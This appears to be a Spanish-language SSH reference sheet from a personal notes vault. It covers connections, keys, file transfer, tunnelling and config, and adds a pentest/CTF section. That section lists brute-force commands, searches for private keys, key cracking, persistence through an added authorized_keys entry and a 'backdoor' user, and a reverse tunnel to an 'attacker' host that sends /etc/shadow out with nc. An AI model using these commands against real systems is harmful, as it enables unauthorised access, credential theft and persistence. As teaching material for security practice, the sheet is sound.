# SSH â€” Secure Shell

> [!info] Herramienta
> Protocolo de acceso remoto seguro. Permite ejecutar comandos, transferir archivos y tunelizar conexiones.

> â†’

---

## ConexiÃ³n BÃ¡sica

> [!tip] Formato general
> `ssh <usuario>@<host>`

```bash
# ConexiÃ³n bÃ¡sica
ssh user@192.168.1.100

# Con puerto especÃ­fico
ssh -p 2222 user@192.168.1.100

# Con usuario por defecto (tu usuario local)
ssh 192.168.1.100

# Verbose (debug)
ssh -vvv user@192.168.1.100
```

---

## AutenticaciÃ³n

```bash
# Con contraseÃ±a (prompts)
ssh user@host

# Con clave pÃºblica
ssh -i ~/.ssh/id_rsa user@host

# Con clave privada (PEM)
ssh -i key.pem ec2-user@compute-1.amazonaws.com

# Deshabilitar verificaciÃ³n de host (CTF, pentest)
ssh -o StrictHostKeyChecking=no user@host

# Deshabilitar known_hosts
ssh -o UserKnownHostsFile=/dev/null user@host
```

---

## Claves SSH

### Generar claves

```bash
# RSA (3072 bits, recomendado)
ssh-keygen -t rsa -b 3072

# Ed25519 (mÃ¡s rÃ¡pido y seguro)
ssh-keygen -t ed25519

# RSA con passphrase
ssh-keygen -t rsa -b 4096 -f ~/.ssh/mi_clave -N "passphrase"

# Sin passphrase (para automatizaciÃ³n)
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""
```

### Gestionar claves

```bash
# Ver clave pÃºblica
cat ~/.ssh/id_rsa.pub

# Copiar clave al servidor
ssh-copy-id user@host
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@host

# Cambiar passphrase de una clave
ssh-keygen -f ~/.ssh/id_rsa -p

# Listar claves conocidas
ls -la ~/.ssh/
```

---

## Transferencia de Archivos

### SCP (Secure Copy)

```bash
# Local â†’ Remoto
scp archivo.txt user@host:/tmp/

# Remoto â†’ Local
scp user@host:/etc/passwd ./passwd.txt

# Con puerto
scp -P 2222 archivo.txt user@host:/tmp/

# Directorio completo (recursivo)
scp -r ./carpeta/ user@host:/tmp/

# Con clave especÃ­fica
scp -i key.pem archivo.txt ec2-user@host:/home/ec2-user/

# Mantener permisos y timestamps
scp -p archivo.txt user@host:/tmp/
```

### SFTP (SSH File Transfer)

```bash
# ConexiÃ³n SFTP
sftp user@host

# Dentro de SFTP
sftp> ls # Listar archivos remotos
sftp> lls # Listar archivos locales
sftp> cd /tmp # Cambiar directorio remoto
sftp> lcd /home/user # Cambiar directorio local
sftp> put archivo.txt # Subir archivo
sftp> get archivo.txt # Descargar archivo
sftp> mput *.txt # Subir mÃºltiples archivos
sftp> mget *.log # Descargar mÃºltiples archivos
sftp> exit # Salir
```

---

## Tunel SSH (Port Forwarding)

### Local Port Forwarding

```bash
# Acceder a host:8080 vÃ­a el servidor SSH
ssh -L 8080:target:80 user@ssh-server

# Acceder a base de datos remota
ssh -L 3306:db-server:3306 user@ssh-server

# Acceder a RDP interno
ssh -L 3389:windows-pc:3389 user@ssh-server

# Bind a interface especÃ­fica
ssh -L 127.0.0.1:8080:target:80 user@ssh-server
```

### Remote Port Forwarding

```bash
# Exponer puerto local al servidor SSH
ssh -R 8080:localhost:3000 user@ssh-server

# Exponer servicio local a red del servidor
ssh -R 0.0.0.0:8080:localhost:3000 user@ssh-server
```

### Dynamic Port Forwarding (SOCKS Proxy)

```bash
# Crear proxy SOCKS5
ssh -D 1080 user@ssh-server

# Usar con curl
curl --socks5-hostname localhost:1080 http://target

# Usar con navegador (configurar proxy SOCKS5)
# Host: 127.0.0.1, Port: 1080
```

---

## SSH Tunneling para Pivoting

```bash
# Tunnel para acceder a red interna
ssh -L 0.0.0.0:445:internal-pc:445 user@pivot
# Multi-hop (jump host)
ssh -J user@jump-host user@target

# Con ProxyJump en config
# Host target
# ProxyJump user@jump-host
# User target-user
```

---

## ConfiguraciÃ³n (~/.ssh/config)

```
# Servidor de producciÃ³n
Host prod
 HostName 192.168.1.100
 User deploy
 Port 2222
 IdentityFile ~/.ssh/prod_key

# Servidor de desarrollo
Host dev
 HostName dev.example.com
 User developer
 ForwardAgent yes

# Jump host
Host internal
 HostName 10.0.0.5
 User admin
 ProxyJump jump-host

# Default
Host *
 ServerAliveInterval 60
 ServerAliveCountMax 3
 StrictHostKeyChecking no
```

```bash
# Uso con config
ssh prod
ssh dev
ssh internal
```

---

## Comandos Remotos

```bash
# Ejecutar comando remoto y salir
ssh user@host "uname -a"

# Ejecutar mÃºltiples comandos
ssh user@host "cd /tmp && ls -la"

# Con sudo
ssh user@host "sudo cat /etc/shadow"

# Ejecutar script local en remoto
ssh user@host "bash -s" < script.sh

# Ejecutar comando con output a archivo local
ssh user@host "cat /etc/passwd" > passwd.txt
```

---

## SSH en Pentest / CTF

### EnumeraciÃ³n

```bash
# Scanear si SSH estÃ¡ abierto
nmap -sV -p 22 target

# Banner grab
nc -vn target 22

# SSH version
ssh -V
```

### Fuerza Bruta

```bash
# Con Hydra
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target

# Con Ncrack
ncrack -p ssh --user user -P passwords.txt target

# Con Medusa
medusa -h target -u user -P passwords.txt -M ssh
```

### Escalada

```bash
# Buscar claves SSH en el sistema
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Copiar clave encontrada
cp /home/user/.ssh/id_rsa ./my_key
chmod 600 my_key
ssh -i my_key user@target

# Si la clave tiene passphrase
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt
ssh -i id_rsa -f hash_password user@target
```

### Persistencia

```bash
# Agregar tu clave pÃºblica al servidor
echo "ssh-rsa AAAA... user@kali" >> /home/victim/.ssh/authorized_keys

# Crear usuario con shell
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
```

---

## SSH Tunneling para ExfiltraciÃ³n

```bash
# Crear tÃºnel para exfiltrar datos
ssh -R 4444:localhost:4444 user@attacker

# En la vÃ­ctima, conectar al puerto local
nc localhost 4444 < /etc/shadow

# O con reverse shell por SSH
ssh -R 4444:localhost:4444 user@attacker
# En attacker: nc -lvnp 4444
```

---

## Opciones Comunes

| OpciÃ³n | DescripciÃ³n |
|--------|-------------|
| `-p <port>` | Puerto SSH (default 22) |
| `-i <key>` | Clave privada |
| `-l <user>` | Usuario |
| `-v / -vv / -vvv` | Verbose (debug) |
| `-L` | Local port forwarding |
| `-R` | Remote port forwarding |
| `-D` | Dynamic port forwarding (SOCKS) |
| `-J` | ProxyJump (jump host) |
| `-N` | No ejecutar comandos (solo tÃºnel) |
| `-f` | Background (con -N) |
| `-o StrictHostKeyChecking=no` | No verificar known_hosts |
| `-o UserKnownHostsFile=/dev/null` | No guardar known_hosts |
| `-C` | CompresiÃ³n |
| `-X / -Y` | X11 forwarding |
| `-A` | Agent forwarding |

---

## Errores Comunes

| Error | Causa | SoluciÃ³n |
|-------|-------|----------|
| `Permission denied (publickey)` | Clave no aceptada | Verificar `authorized_keys`, permisos 600/644 |
| `Host key verification failed` | Host no en known_hosts | `ssh-keygen -R host` |
| `Connection refused` | SSH no estÃ¡ corriendo | Verificar servicio sshd en el host |
| `Connection timed out` | Firewall bloqueando | Verificar reglas iptables/firewalld |
| `Too many authentication failures` | Demasiadas claves | `ssh -o IdentitiesOnly=yes -i key user@host` |
| `Warning: remote host identification has changed` | MITM o host reinstalled | `ssh-keygen -R host` |

---

## Permisos Importantes

```bash
# ~/.ssh debe ser 700
chmod 700 ~/.ssh

# Clave privada debe ser 600
chmod 600 ~/.ssh/id_rsa

# Clave pÃºblica debe ser 644
chmod 644 ~/.ssh/id_rsa.pub

# authorized_keys debe ser 600
chmod 600 ~/.ssh/authorized_keys
```

> [!warning] Permisos incorrectos
> Si los permisos son incorrectos, SSH rechazarÃ¡ la conexiÃ³n. Esto es una medida de seguridad â€” si tu clave privada es legible por otros, la clave no sirve.

---

## Referencia RÃ¡pida

```bash
# ConexiÃ³n bÃ¡sica
ssh user@host

# Con clave
ssh -i key.pem user@host

# Transferir archivo
scp archivo.txt user@host:/tmp/

# Tunnel local
ssh -L 8080:target:80 user@proxy

# Tunnel dinÃ¡mico (SOCKS)
ssh -D 1080 user@proxy

# Comando remoto
ssh user@host "comando"

# Generar clave
ssh-keygen -t ed25519

# Copiar clave
ssh-copy-id user@host
```

â†’

